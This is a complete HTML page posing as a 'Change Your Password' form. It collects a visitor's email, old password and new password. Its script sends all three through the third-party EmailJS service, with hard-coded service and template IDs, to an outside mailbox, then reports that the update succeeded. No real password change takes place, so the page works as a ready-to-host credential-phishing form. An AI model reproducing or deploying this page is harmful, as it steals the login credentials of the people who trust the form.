<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Change Your Password</title>
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    <script>
        (function() {
            emailjs.init("0DWuzZ-mZLM196nkP");  // Public Key
        })();
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .form-container {
            background: white;
            padding: 20px 30px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0,0,0,0.1);
            width: 300px;
        }
        .form-container h2 {
            text-align: center;
            margin-bottom: 20px;
        }
        .form-container input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .form-container button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            border: none;
            color: white;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
        }
        .form-container button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>

<div class="form-container">
    <h2>Change Your Password</h2>
    <form id="passwordForm">
        <input type="email" name="email" placeholder="Email Address" required>
        <input type="password" name="old_password" placeholder="Old Password" required>
        <input type="password" name="new_password" placeholder="New Password" required>
        <button type="submit">Update Password</button>
    </form>
</div>

<script>
    document.getElementById('passwordForm').addEventListener('submit', function(e) {
        e.preventDefault();

        const email = this.email.value;
        const old_password = this.old_password.value;
        const new_password = this.new_password.value;

        emailjs.send('service_8hdqzju', 'template_hk6uqi8', {
            email: email,
            old_password: old_password,
            new_password: new_password
        })
        .then(function(response) {
            alert('Password update sent successfully!');
            document.getElementById('passwordForm').reset();
        }, function(error) {
            console.error('FAILED...', error);
            alert('There was an error. Try again.');
        });
    });
</script>

</body>
</html>
